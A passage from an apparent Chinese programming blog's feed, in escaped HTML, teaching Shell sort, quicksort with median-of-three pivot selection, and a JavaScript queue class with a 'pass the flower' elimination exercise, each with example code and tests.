href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/21.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/21.png" alt="image-20200305110724309"></a></p><p>以下代码实现中采用希尔排序原稿中建议的增量即<strong>N / 2</strong> 。</p><p><strong>代码实现：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//希尔排序</span></span><br><span class="line">ArrayList.prototype.shellSort = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="comment">//1.获取数组的长度</span></span><br><span class="line">  <span class="keyword">let</span> length = <span class="built_in">this</span>.array.length</span><br><span class="line"></span><br><span class="line">  <span class="comment">//2.初始化增量</span></span><br><span class="line">  <span class="keyword">let</span> gap = <span class="built_in">Math</span>.floor(length / <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment">//3.第一层循环：while循环(使gap不断减小)</span></span><br><span class="line">  <span class="keyword">while</span>(gap &gt;= <span class="number">1</span> )&#123;</span><br><span class="line">    <span class="comment">//4.第二层循环：以gap为增量，进行分组，对分组进行插入排序</span></span><br><span class="line">    <span class="comment">//重点为：将index = gap作为选中的第一个数据</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = gap; i &lt; length; i++)&#123;</span><br><span class="line">      <span class="keyword">let</span> temp = <span class="built_in">this</span>.array[i]</span><br><span class="line">      <span class="keyword">let</span> j = i</span><br><span class="line">      <span class="comment">//5.第三层循环:寻找正确的插入位置</span></span><br><span class="line">      <span class="keyword">while</span>(<span class="built_in">this</span>.array[j - gap] &gt; temp &amp;&amp; j &gt; gap - <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">this</span>.array[j] = <span class="built_in">this</span>.array[j - gap]</span><br><span class="line">        j -= gap</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="comment">//6.将j位置的元素设置为temp</span></span><br><span class="line">    <span class="built_in">this</span>.array[j] = temp</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    gap = <span class="built_in">Math</span>.floor(gap / <span class="number">2</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里解释一下上述代码中的三层循环：</p><ul><li><strong>第一层循环：</strong>while循环，控制gap递减到1；</li><li><strong>第二层循环：</strong>分别取出根据g增量gap分成的gap组数据：将index = gap的数据作为选中的第一个数据，如下图所示，gap=5，则index = gap的数据为3，index = gap - 1的数据为8，两个数据为一组。随后gap不断加1右移，直到gap &lt; length，此时实现了将数组分为5组。</li></ul><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/21.5.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/21.5.png" alt="image-20200305104914438"></a></p><ul><li><strong>第三层循环：</strong>对每一组数据进行插入排序；</li></ul><p><strong>测试代码：</strong></p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">//测试类</span><br><span class="line"> let list = new ArrayList()</span><br><span class="line"></span><br><span class="line"> //插入元素</span><br><span class="line"> list.<span class="built_in">insert</span>(<span class="number">66</span>)</span><br><span class="line"> list.<span class="built_in">insert</span>(<span class="number">88</span>)</span><br><span class="line"> list.<span class="built_in">insert</span>(<span class="number">12</span>)</span><br><span class="line"> list.<span class="built_in">insert</span>(<span class="number">87</span>)</span><br><span class="line"> list.<span class="built_in">insert</span>(<span class="number">100</span>)</span><br><span class="line"> list.<span class="built_in">insert</span>(<span class="number">5</span>)</span><br><span class="line"> list.<span class="built_in">insert</span>(<span class="number">566</span>)</span><br><span class="line"> list.<span class="built_in">insert</span>(<span class="number">23</span>)</span><br><span class="line"> // console.<span class="built_in">log</span>(list);</span><br><span class="line"></span><br><span class="line"> //验证希尔排序</span><br><span class="line"> list.shellSort()</span><br><span class="line"> console.<span class="built_in">log</span>(list);</span><br></pre></td></tr></table></figure><p><strong>测试结果：</strong></p><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/22.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/22.png" alt="image-20200305114934209"></a></p><p><strong>希尔排序的效率：</strong></p><ul><li>希尔排序的效率和增量有直接关系，即使使用原稿中的增量效率都高于简单排序。</li></ul><h4 id="5-快速排序"><a href="#5-快速排序" class="headerlink" title="5.快速排序"></a>5.快速排序</h4><p>快速排序的介绍：</p><ul><li><strong>快速排序</strong>可以说是<strong>目前所有排序算法</strong>中，<strong>最快</strong>的一种排序算法。当然，没有任何一种算法是在任意情况下都是最优的。但是，大多数情况下快速排序是比较好的选择。</li><li><strong>快速排序</strong>其实是<strong>冒泡排序</strong>的升级版；</li></ul><p>快速排序的核心思想是<strong>分而治之</strong>，先选出一个数据（比如65），将比其小的数据都放在它的左边，将比它大的数据都放在它的右边。这个数据称为<strong>枢纽</strong></p><p>和冒泡排序的不同：</p><ul><li>我们选择的65可以一次性将它放在最正确的位置，之后就不需要做任何移动；</li><li>而冒泡排序即使已经找到最大值，也需要继续移动最大值，直到将它移动到最右边；</li></ul><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/23.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/23.png" alt="image-20200305154504624"></a></p><p><strong>快速排序的枢纽：</strong></p><ul><li><strong>第一种方案：</strong>直接选择第一个元素作为枢纽。但是，当第一个元素就是最小值的情况下，效率不高；</li><li><strong>第二种方案：</strong>使用随机数。随机数本身十分消耗性能，不推荐；</li><li><strong>优秀的解决方法：</strong>取index为头、中、位的三个数据排序后的中位数；如下图所示，按下标值取出的三个数据为：92，31，0，经排序后变为：0，31，92，取其中的中位数31作为<strong>枢纽</strong>（当（length-1）/2不整除时可向下或向上取整）：</li></ul><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/24.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/24.png" alt="image-20200305182934710"></a></p><p><strong>实现枢纽选择：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//交换两个位置的数据</span></span><br><span class="line"><span class="keyword">let</span> swap = <span class="function"><span class="keyword">function</span>(<span class="params">arr, m, n</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> temp  = arr[m]</span><br><span class="line">    arr[m] = arr[n]</span><br><span class="line">    arr[n] = temp</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//快速排序</span></span><br><span class="line"><span class="comment">//1.选择枢纽</span></span><br><span class="line"><span class="keyword">let</span> median = <span class="function"><span class="keyword">function</span>(<span class="params">arr</span>)</span>&#123;</span><br><span class="line">  <span class="comment">//1.取出中间的位置</span></span><br><span class="line">  <span class="keyword">let</span> center = <span class="built_in">Math</span>.floor(arr.length / <span class="number">2</span>)</span><br><span class="line">  <span class="keyword">let</span> right = arr.length - <span class="number">1</span> </span><br><span class="line">  <span class="keyword">let</span> left = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//2.判断大小并进行交换</span></span><br><span class="line">  <span class="keyword">if</span> (arr[left] &gt; arr[center]) &#123;</span><br><span class="line">    swap(arr, left, center)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (arr[center] &gt; arr[right])&#123;</span><br><span class="line">    swap(arr, center, right)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (arr[left] &gt; arr[right]) &#123;</span><br><span class="line">    swap(arr, left, right)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//3.返回枢纽</span></span><br><span class="line">  <span class="keyword">return</span> center</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>数组经过获取枢纽函数操作之后，选出的3个下标值对应的数据位置变为：</p><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/25.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/25.png" alt="image-20200320091750654"></a></p><p><strong>动态过程：</strong></p><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/26.gif"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/26.gif" alt="img"></a></p><p><strong>快速排序代码实现：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//2.快速排序</span></span><br><span class="line"><span class="keyword">let</span> QuickSort = <span class="function"><span class="keyword">function</span>(<span class="params">arr</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (arr.length == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> []</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> center = median(arr)</span><br><span class="line">  <span class="keyword">let</span> c = arr.splice(center, <span class="number">1</span>)</span><br><span class="line">  <span class="keyword">let</span> l = []</span><br><span class="line">  <span class="keyword">let</span> r = []</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (arr[i] &lt; c) &#123;</span><br><span class="line">        l.push(arr[i])</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        r.push(arr[i])</span><br><span class="line">      &#125;        </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> QuickSort(l).concat(c, QuickSort(r))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>算法的巧妙之处在于通过:</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QuickSort(l)<span class="selector-class">.concat</span>(c, QuickSort(r))</span><br></pre></td></tr></table></figure><p>递归调用<code>QuickSort</code>函数实现了枢纽<code>Center</code>左边数据<code>l</code>和右边数据<code>r</code>的排序；</p><p><strong>测试代码：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">0</span>, <span class="number">13</span>, <span class="number">81</span>, <span class="number">43</span>, <span class="number">31</span>, <span class="number">27</span>, <span class="number">56</span>, <span class="number">92</span>]</span><br><span class="line"><span class="built_in">console</span>.log(QuickSort(arr));</span><br></pre></td></tr></table></figure><p><strong>测试结果</strong></p><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/28.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/28.png" alt="image-20200320092254048"></a></p><p><strong>快速排序的效率：</strong></p><ul><li>快速排序最坏情况下的效率：每次选择的枢纽都是最左边或最右边的数据，此时效率等同于冒泡排序，时间复杂度为<strong>O（n2）</strong>。可根据不同的枢纽选择避免这一情况；</li><li>快速排序的平均效率：为<strong>O（N*logN）</strong>，虽然其他算法效率也可达到O（N*logN），但是其中快速排序是<strong>最好的</strong>。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="数据结构" scheme="http://aiolimp.com/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    
    <category term="数据结构" scheme="http://aiolimp.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript实现队列结构（Queue）</title>
    <link href="http://aiolimp.com/2022/07/08/JavaScript%E5%AE%9E%E7%8E%B0%E9%98%9F%E5%88%97%E7%BB%93%E6%9E%84%EF%BC%88Queue%EF%BC%89/"/>
    <id>http://aiolimp.com/2022/07/08/JavaScript%E5%AE%9E%E7%8E%B0%E9%98%9F%E5%88%97%E7%BB%93%E6%9E%84%EF%BC%88Queue%EF%BC%89/</id>
    <published>2022-07-08T02:23:20.000Z</published>
    <updated>2023-03-05T14:22:03.761Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="JavaScript实现队列结构（Queue）"><a href="#JavaScript实现队列结构（Queue）" class="headerlink" title="JavaScript实现队列结构（Queue）"></a>JavaScript实现队列结构（Queue）</h2><h3 id="一、队列简介"><a href="#一、队列简介" class="headerlink" title="一、队列简介"></a>一、队列简介</h3><p>队列是是一种受限的线性表，特点为<strong>先进先出</strong>（<strong>FIFO</strong>：first in first out）</p><ul><li>受限之处在于它只允许在表的<strong>前端</strong>（front）进行删除操作；</li><li>在表的<strong>后端</strong>（rear）进行插入操作；<a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E9%98%9F%E5%88%97/1.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E9%98%9F%E5%88%97/1.png" alt="image-20200226171659886"></a></li></ul><p>相当于排队买票，先来的先买票，后来的后买票。</p><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E9%98%9F%E5%88%97/2.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E9%98%9F%E5%88%97/2.png" alt="image-20200226171449228"></a></p><p><strong>队列的应用：</strong></p><ul><li>打印队列：计算机打印多个文件的时候，需要排队打印；</li><li>线程队列：当开启多线程时，当新开启的线程所需的资源不足时就先放入线程队列，等待CPU处理</li></ul><p><strong>队列类的实现：</strong></p><p>队列的实现和栈一样，有两种方案：</p><ul><li>基于数组实现；</li><li>基于链表实现；</li></ul><p><strong>队列的常见操作：</strong></p><ul><li>enqueue（element）：向队列尾部添加一个（或多个）新的项；</li><li>dequeue（）：移除队列的第一（即排在队列最前面的）项，并返回被移除的元素；</li><li>front（）：返回队列中的第一个元素——最先被添加，也将是最先被移除的元素。队列不做任何变动（不移除元素，只返回元素信息与Stack类的peek方法非常类似）；</li><li>isEmpty（）：如果队列中不包含任何元素，返回true，否则返回false；</li><li>size（）：返回队列包含的元素个数，与数组的length属性类似；</li><li>toString（）：将队列中的内容，转成字符串形式；</li></ul><h3 id="二、封装队列类"><a href="#二、封装队列类" class="headerlink" title="二、封装队列类"></a>二、封装队列类</h3><h4 id="2-1-代码实现"><a href="#2-1-代码实现" class="headerlink" title="2.1.代码实现"></a>2.1.代码实现</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 基于数组封装队列类</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Queue</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="comment">// 属性</span></span><br><span class="line">  <span class="built_in">this</span>.items = []</span><br><span class="line">  </span><br><span class="line"><span class="comment">// 方法</span></span><br><span class="line"><span class="comment">// 1.enqueue():将元素加入到队列中</span></span><br><span class="line">Queue.prototype.enqueue = <span class="function"><span class="params">element</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">this</span>.items.push(element)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.dequeue():从队列中删除前端元素</span></span><br><span class="line">Queue.prototype.dequeue = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">this</span>.items.shift()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3.front():查看前端的元素</span></span><br><span class="line">Queue.prototype.front = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">this</span>.items[<span class="number">0</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4.isEmpty:查看队列是否为空</span></span><br><span class="line">Queue.prototype.isEmpty = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">this</span>.items.length == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5.size():查看队列中元素的个数</span></span><br><span class="line">Queue.prototype.size = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">this</span>.items.length</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 6.toString():将队列中元素以字符串形式输出</span></span><br><span class="line">Queue.prototype.toString = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> resultString = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i <span class="keyword">of</span> <span class="built_in">this</span>.items)&#123;</span><br><span class="line">      resultString += i + <span class="string">&#x27; &#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> resultString</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>测试代码：</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建队列</span></span><br><span class="line">  let queue = <span class="keyword">new</span>  <span class="built_in">Queue</span>()</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 将元素加入到队列中</span></span><br><span class="line">  queue.<span class="built_in">enqueue</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">  queue.<span class="built_in">enqueue</span>(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">  queue.<span class="built_in">enqueue</span>(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">  queue.<span class="built_in">enqueue</span>(<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">  console.<span class="built_in">log</span>(queue);<span class="comment">//58</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 从队列中删除元素</span></span><br><span class="line">  queue.<span class="built_in">dequeue</span>()</span><br><span class="line">  console.<span class="built_in">log</span>(queue);<span class="comment">//62</span></span><br><span class="line">  queue.<span class="built_in">dequeue</span>()</span><br><span class="line">  console.<span class="built_in">log</span>(queue);<span class="comment">//64</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//front</span></span><br><span class="line">  console.<span class="built_in">log</span>(queue.<span class="built_in">front</span>()); <span class="comment">//67</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 验证其他方法</span></span><br><span class="line">  console.<span class="built_in">log</span>(queue.<span class="built_in">isEmpty</span>()); <span class="comment">//70</span></span><br><span class="line">  console.<span class="built_in">log</span>(queue.<span class="built_in">size</span>()); <span class="comment">//71</span></span><br><span class="line">  console.<span class="built_in">log</span>(queue.<span class="built_in">toString</span>()); <span class="comment">//72</span></span><br></pre></td></tr></table></figure><p><strong>测试结果：</strong></p><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E9%98%9F%E5%88%97/3.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E9%98%9F%E5%88%97/3.png" alt="image-20200305211334015"></a></p><h4 id="2-2-队列的应用"><a href="#2-2-队列的应用" class="headerlink" title="2.2.队列的应用"></a>2.2.队列的应用</h4><p>使用队列实现小游戏：击鼓传花，传入一组数据和设定的数字num，循环遍历数组内元素，遍历到的元素为指定数字num时将该元素删除，直至数组剩下一个元素。</p><p><strong>代码实现：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 队列应用：面试题：击鼓传花</span></span><br><span class="line"><span class="keyword">let</span> passGame = <span class="function">(<span class="params">nameList, num</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">//1.创建队列结构</span></span><br><span class="line">  <span class="keyword">let</span> queue = <span class="keyword">new</span> Queue()</span><br><span class="line"></span><br><span class="line">  <span class="comment">//2.将所有人依次加入队列</span></span><br><span class="line">  <span class="comment">// 这是ES6的for循环写法，i相当于nameList[i]</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i <span class="keyword">of</span> nameList)&#123;</span><br><span class="line">    queue.enqueue(i)</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  <span class="comment">// 3.开始数数</span></span><br><span class="line"> <span class="keyword">while</span>(queue.size() &gt; <span class="number">1</span>)&#123;<span class="comment">//队列中只剩1个人就停止数数</span></span><br><span class="line">  <span class="comment">// 不是num的时候，重新加入队列末尾</span></span><br><span class="line">  <span class="comment">// 是num的时候，将其从队列中删除</span></span><br><span class="line">  <span class="comment">// 3.1.num数字之前的人重新放入队列的末尾(把队列前面删除的加到队列最后)</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i&lt; num-<span class="number">1</span>; i++ )&#123;</span><br><span class="line">    queue.enqueue(queue.dequeue())</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 3.2.num对应这个人，直接从队列中删除</span></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    思路是这样的，由于队列没有像数组一样的下标值不能直接取到某一元素，所以采用，把num前面的num-1个元素先删除后添加到队列末尾，这样第num个元素就排到了队列的最前面，可以直接使用dequeue方法进行删除</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  queue.dequeue()</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//4.获取剩下的那个人</span></span><br><span class="line">  <span class="built_in">console</span>.log(queue.size());<span class="comment">//104</span></span><br><span class="line">  <span class="keyword">let</span> endName = queue.front()</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;最终剩下的人：&#x27;</span> + endName);   <span class="comment">//106</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> nameList.indexOf(endName);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//5.测试击鼓传花</span></span><br><span class="line"><span class="keyword">let</span> names = [<span class="string">&#x27;lily&#x27;</span>, <span class="string">&#x27;lucy&#x27;</span>, <span 